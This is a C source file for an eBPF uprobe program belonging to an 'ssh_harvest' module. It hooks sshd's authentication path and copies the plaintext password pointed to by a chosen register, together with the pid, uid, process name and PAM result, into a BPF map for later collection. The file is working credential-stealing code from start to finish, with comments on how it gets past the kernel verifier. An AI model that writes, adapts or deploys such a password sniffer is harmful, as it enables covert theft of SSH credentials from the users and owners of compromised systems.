// SPDX-License-Identifier: GPL-2.0
// Minimal eBPF uprobe program for the ssh_harvest Starlark module.
//
// The module attaches this program at a file offset inside sshd's
// authentication path. On every hit the program:
//   1. reads the desired password register (selected through the `cfg` map),
//   2. records the current pid/uid/comm and RAX (the PAM result),
//   3. copies the NUL-terminated user string the register points at into the
//      `events` map, keyed by pid.
//
// It is deliberately self-contained: no kernel or libbpf headers are needed,
// so it builds with `zig cc -target bpfel-freestanding`. Maps are BTF-defined
// because libbpf v1.0+ rejects the legacy `struct bpf_map_def` layout; zig's
// clang emits the required `.BTF` sections. The map layout and the
// `struct event` layout are ABI with core/lib/libbpf (types.go /
// uprobe_linux.go) and must not drift.

#define SEC(NAME) __attribute__((section(NAME), used))

typedef unsigned int __u32;
typedef unsigned long long __u64;
typedef long long __s64;

// libbpf's BTF map-definition idiom.
#define __uint(name, val) int (*name)[val]
#define __type(name, val) typeof(val) *name

#define BPF_MAP_TYPE_HASH 1
#define BPF_ANY 0

// x86_64 pt_regs as delivered to a uprobe program. Field order is fixed by
// the kernel ABI; the register array in probe() mirrors libbpf's
// ArgRegisters order in core/lib/libbpf/types.go.
struct pt_regs {
  __u64 r15;
  __u64 r14;
  __u64 r13;
  __u64 r12;
  __u64 bp;
  __u64 bx;
  __u64 r11;
  __u64 r10;
  __u64 r9;
  __u64 r8;
  __u64 ax;
  __u64 cx;
  __u64 dx;
  __u64 si;
  __u64 di;
  __u64 orig_ax;
  __u64 ip;
  __u64 cs;
  __u64 flags;
  __u64 sp;
  __u64 ss;
};

// Mirrors libbpf.UprobeEvent / decodeUprobeEvent: 96 bytes, see
// core/lib/libbpf/uprobe_linux.go.
struct event {
  __u32 pid;
  __u32 uid;
  __s64 retval;
  char comm[16];
  char arg[64];
};

// BPF helper IDs (include/uapi/linux/bpf.h). Declaring them as function
// pointers is the header-free way to emit helper calls.
static void *(*bpf_map_lookup_elem)(void *map, const void *key) = (void *)1;
static long (*bpf_map_update_elem)(void *map, const void *key,
                                   const void *value, __u64 flags) = (void *)2;
static __u64 (*bpf_get_current_pid_tgid)(void) = (void *)14;
static __u64 (*bpf_get_current_uid_gid)(void) = (void *)15;
static long (*bpf_get_current_comm)(void *buf, __u32 size) = (void *)16;
static long (*bpf_probe_read_user_str)(void *dst, __u32 size,
                                       const void *unsafe_ptr) = (void *)114;

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 1);
  __type(key, __u32);
  __type(value, __u32);
} cfg SEC(".maps");

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 1024);
  __type(key, __u32);
  __type(value, struct event);
} events SEC(".maps");

char _license[] SEC("license") = "GPL";

// The register order matches libbpf.ArgRegisters (RAX first, then the
// argument and callee-saved registers).
//
// Every register is read with a direct, constant-offset ctx field access into
// a volatile stack array, then the cfg-selected index picks one element. A
// switch (or any computed ctx access) is rejected by the verifier with
// "dereference of modified ctx ptr" because clang folds its cases into a
// shared load through a derived ctx pointer; volatile keeps the loads at
// their original constant offsets and the bound check makes the variable
// stack index acceptable to the verifier.
#define NR_REGS 14

SEC("uprobe")
int probe(struct pt_regs *ctx) {
  __u32 zero = 0;
  __u32 *idx = bpf_map_lookup_elem(&cfg, &zero);
  if (!idx)
    return 0;

  volatile __u64 regs[NR_REGS];
  regs[0] = ctx->ax;
  regs[1] = ctx->di;
  regs[2] = ctx->si;
  regs[3] = ctx->dx;
  regs[4] = ctx->cx;
  regs[5] = ctx->r8;
  regs[6] = ctx->r9;
  regs[7] = ctx->bp;
  regs[8] = ctx->sp;
  regs[9] = ctx->bx;
  regs[10] = ctx->r12;
  regs[11] = ctx->r13;
  regs[12] = ctx->r14;
  regs[13] = ctx->r15;

  __u32 reg = *idx;
  if (reg >= NR_REGS)
    return 0;
  __u64 arg_ptr = regs[reg];
  if (!arg_ptr)
    return 0;

  struct event ev = {};
  __u64 pid_tgid = bpf_get_current_pid_tgid();
  ev.pid = pid_tgid >> 32; // tgid, the process, not the thread
  ev.uid = bpf_get_current_uid_gid() & 0xffffffff;
  ev.retval = regs[0]; // PAM result (RAX) read at the probe point
  bpf_get_current_comm(ev.comm, sizeof(ev.comm));
  bpf_probe_read_user_str(ev.arg, sizeof(ev.arg), (const void *)arg_ptr);

  __u32 key = ev.pid;
  bpf_map_update_elem(&events, &key, &ev, BPF_ANY);
  return 0;
}
